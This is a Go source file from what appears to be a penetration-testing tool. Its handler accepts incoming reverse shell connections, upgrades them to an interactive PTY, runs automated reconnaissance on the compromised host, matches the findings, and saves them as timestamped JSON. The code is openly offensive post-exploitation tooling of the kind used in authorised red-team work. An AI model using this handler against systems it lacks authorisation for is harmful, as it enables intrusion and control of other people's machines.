package main

import (
	"encoding/json"
	"fmt"
	"net"
	"os"
	"path/filepath"
	"strings"
	"time"
)

func handleSession(conn net.Conn, verbosity int) {
	defer conn.Close()

	addr := conn.RemoteAddr()
	fmt.Println()
	fmt.Println("                                 ▄███▄                             ")
	fmt.Println("                                 ▀▀▀▀▀")
	fmt.Println("   ▄▄▄  ▄▄     ▄▄▄▄  ▄▄▄  ▄▄▄▄  ▀█▀▀▀█▀ ▄▄  ▄▄")
	fmt.Println("  ██▀██ ██    ██▀▀▀ ██▀██ ██▄█▀ ██ ▄ ██ ███▄██")
	fmt.Println("  ██▀██ ██▄▄▄ ▀████ ██▀██ ██     ▀█▀█▀  ██ ▀██")
	fmt.Println()
	fmt.Printf("[+] New reverse shell connection from %s\n", addr)

	disp := newStatusDisplay()
	defer disp.stop() // always stop spinner on exit (error paths)

	u := NewPTYUpgrader(conn, verbosity, disp) // registers PTY Upgrade + Terminal Setup tasks
	reconIdx := disp.addTask("Reconnaissance")

	if err := u.Upgrade(); err != nil {
		disp.stop()
		fmt.Printf("[!] PTY upgrade failed: %v\n", err)
		return
	}

	findingsDir := "findings"
	if err := os.MkdirAll(findingsDir, 0755); err != nil {
		fmt.Printf("[!] Could not create findings directory: %v\n", err)
	}

	raw, rawPath, err := executeRecon(u, findingsDir, addr.String(), disp, reconIdx)
	if err != nil {
		disp.stop()
		fmt.Printf("[!] Recon failed: %v\n", err)
		return
	}

	// Drain the prompt left in the bufio buffer after the recon sentinel.
	u.readUntilPrompt(1 * time.Second)

	findings := parseReconOutput(raw)
	matches := matchFindings(findings)

	// Stop the spinner and wipe the task list before printing the report.
	disp.stop()
	disp.clear()

	if rawPath != "" {
		fmt.Printf("[*] Raw output saved to: %s\n", rawPath)
	}

	// saveFindings marshals JSON and writes to disk — run it concurrently
	// with printSummary which is pure string formatting + stdout.
	// The returned path is buffered and printed after Interact() so it
	// doesn't interleave with raw-mode terminal output.
	savedPath := make(chan string, 1)
	go func() { savedPath <- saveFindings(findings, addr) }()
	printSummary(findings, matches)

	u.Interact()

	if path := <-savedPath; path != "" {
		fmt.Printf("\n[*] Findings saved to: %s\n", path)
	}
}

func saveFindings(f *Findings, addr net.Addr) string {
	findingsDir := "findings"
	if err := os.MkdirAll(findingsDir, 0755); err != nil {
		fmt.Printf("[!] Could not create findings directory: %v\n", err)
		return ""
	}

	timestamp := time.Now().Format("20060102_150405")
	host := "unknown"
	if addr != nil {
		host = addr.String()
		if strings.Contains(host, ":") {
			parts := strings.Split(host, ":")
			host = strings.Join(parts[:len(parts)-1], ":")
		}
	}
	filename := fmt.Sprintf("findings_%s_%s.json", host, timestamp)
	outpath := filepath.Join(findingsDir, filename)

	data, err := json.MarshalIndent(f, "", "  ")
	if err != nil {
		fmt.Printf("[!] Could not marshal findings: %v\n", err)
		return ""
	}

	if err := os.WriteFile(outpath, data, 0644); err != nil {
		fmt.Printf("[!] Could not save findings: %v\n", err)
		return ""
	}

	return outpath
}
